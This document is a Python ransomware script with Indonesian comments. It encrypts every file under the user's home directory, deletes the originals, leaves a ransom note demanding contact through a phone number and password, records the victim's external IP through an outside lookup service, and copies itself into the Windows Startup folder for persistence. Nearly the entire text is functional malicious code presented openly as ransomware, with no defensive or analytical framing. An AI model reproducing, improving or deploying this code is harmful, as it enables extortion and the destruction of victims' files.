import os
import cryptography.fernet
from cryptography.fernet import Fernet
import base64
import time
import threading
import random
import platform
import socket
import requests  # Untuk verifikasi IP
import sys  # Untuk mematikan program
import shutil  # Untuk menyalin file

# Konfigurasi
NUMBER = '085943799686'
PASSWORD = '87790'
FILE_EXTENSION = ".encrypted"  # Ekstensi untuk file terenkripsi
CHUNK_SIZE = 64 * 1024  # Ukuran chunk untuk enkripsi (64KB)
TARGET_DIRECTORIES = [os.path.expanduser("~")]  # Default: Direktori home user

# ============================================================
# FUNGSI UTILITAS
# ============================================================

def generate_key():
    """Membuat kunci enkripsi baru."""
    return Fernet.generate_key()

def get_machine_id():
    """Membuat ID unik untuk mesin berdasarkan hardware."""
    # Perhatikan: Ini sangat mendasar. Cara yang lebih kuat melibatkan kombinasi
    # informasi motherboard, CPU, dll.
    return platform.node() + platform.machine()

def is_valid_ip(ip_address):
    """Memverifikasi bahwa string adalah alamat IPv4 atau IPv6 yang valid."""
    try:
        socket.inet_pton(socket.AF_INET, ip_address)  # IPv4
    except socket.error:
        try:
            socket.inet_pton(socket.AF_INET6, ip_address)  # IPv6
        except socket.error:
            return False
    return True

def get_external_ip():
    """Mencoba mendapatkan alamat IP eksternal."""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=3)
        data = response.json()
        ip_address = data['ip']
        if is_valid_ip(ip_address):
            return ip_address
        else:
            return "Tidak diketahui (IP tidak valid)"
    except requests.RequestException:
        return "Tidak diketahui (tidak dapat terhubung)"

# ============================================================
# FUNGSI ENKRIPSI DAN DEKRIPSI
# ============================================================

def encrypt_file(file_path, key):
    """Enkripsi file menggunakan kunci yang diberikan."""
    try:
        f = Fernet(key)
        temp_file = file_path + ".tmp"  # File sementara
        with open(file_path, "rb") as infile, open(temp_file, "wb") as outfile:
            while True:
                chunk = infile.read(CHUNK_SIZE)
                if not chunk:
                    break
                encrypted_chunk = f.encrypt(chunk)
                outfile.write(encrypted_chunk)

        # Ganti file asli dengan yang terenkripsi (lebih aman)
        os.remove(file_path)
        os.rename(temp_file, file_path + FILE_EXTENSION)
        print(f"Berhasil dienkripsi: {file_path}")

    except Exception as e:
        print(f"Gagal mengenkripsi {file_path}: {e}")

def decrypt_file(file_path, key):
    """Dekripsi file menggunakan kunci yang diberikan."""
    try:
        if not file_path.endswith(FILE_EXTENSION):
            print(f"Bukan file terenkripsi: {file_path}")
            return

        f = Fernet(key)
        temp_file = file_path + ".tmp"
        with open(file_path, "rb") as infile, open(temp_file, "wb") as outfile:
            while True:
                chunk = infile.read(CHUNK_SIZE)
                if not chunk:
                    break
                decrypted_chunk = f.decrypt(chunk)
                outfile.write(decrypted_chunk)

        # Ganti file terenkripsi dengan yang didekripsi
        os.remove(file_path)
        new_file_path = file_path[:-len(FILE_EXTENSION)]  # Hapus ekstensi
        os.rename(temp_file, new_file_path)
        print(f"Berhasil didekripsi: {file_path}")

    except Exception as e:
        print(f"Gagal mendekripsi {file_path}: {e}")

def process_directory(dir_path, key, encrypt=True):
    """Memproses semua file dalam direktori yang diberikan."""
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            if encrypt:
                encrypt_file(file_path, key)
            else:
                decrypt_file(file_path, key)

# ============================================================
# FUNGSI PERSISTENSI (JANGAN DIGUNAKAN KECUALI ANDA TAHU APA YANG ANDA LAKUKAN)
# ============================================================

def create_persistence():
    """Mencoba membuat persistensi agar ransomware berjalan saat startup."""
    # Perhatian: Ini sangat bergantung pada sistem operasi dan membutuhkan izin.
    # Ini hanyalah contoh dan mungkin tidak berfungsi di semua sistem.
    try:
        if platform.system() == "Windows":
            # Buat salinan ransomware di direktori Startup
            startup_dir = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            script_path = os.path.abspath(sys.argv[0])  # Lokasi skrip saat ini
            new_script_path = os.path.join(startup_dir, "ransomware.py")  # Nama yang lebih umum

            shutil.copyfile(script_path, new_script_path)
            print(f"Persistensi dibuat di: {new_script_path}")
        else:
            print("Persistensi belum diimplementasikan untuk sistem operasi ini.")

    except Exception as e:
        print(f"Gagal membuat persistensi: {e}")

# ============================================================
# FUNGSI UTAMA
# ============================================================

def main():
    """Fungsi utama untuk menjalankan ransomware atau dekripsi."""

    # ID Mesin
    machine_id = get_machine_id()

    # IP Eksternal
    external_ip = get_external_ip()

    # Buat kunci enkripsi
    key = generate_key()

    # Simpan kunci (cara aman untuk menyimpannya sangat penting dalam produksi)
    with open("kunci.key", "wb") as key_file:
        key_file.write(key)

    # Pilih mode: enkripsi atau dekripsi
    mode = input("Enkripsi (e) atau Dekripsi (d)? ").lower()

    if mode == 'e':
        # Enkripsi
        print("Memulai enkripsi...")
        for target_dir in TARGET_DIRECTORIES:
            process_directory(target_dir, key, encrypt=True)

        # Pesan tebusan
        ransom_message = f"""
            PERHATIAN!

            File-file Anda telah dienkripsi.

            ID Mesin: {machine_id}
            IP Eksternal: {external_ip}

            Untuk mendapatkan kunci dekripsi, hubungi nomor {NUMBER} dan berikan password {PASSWORD}.
            Sertakan ID Mesin dan IP Eksternal Anda.

            Jangan mencoba mendekripsi file Anda sendiri, atau Anda akan merusaknya secara permanen!
            """

        # Simpan pesan tebusan
        with open("README.txt", "w") as ransom_file:
            ransom_file.write(ransom_message)

        print("Enkripsi selesai. Pesan tebusan telah dibuat.")

        # Buat persistensi
        create_persistence() # Perhatikan: Risiko!

    elif mode == 'd':
        # Dekripsi
        print("Memulai dekripsi...")
        for target_dir in TARGET_DIRECTORIES:
            process_directory(target_dir, key, encrypt=False)
        print("Dekripsi selesai.")

    else:
        print("Mode tidak valid.")

if __name__ == "__main__":
    main()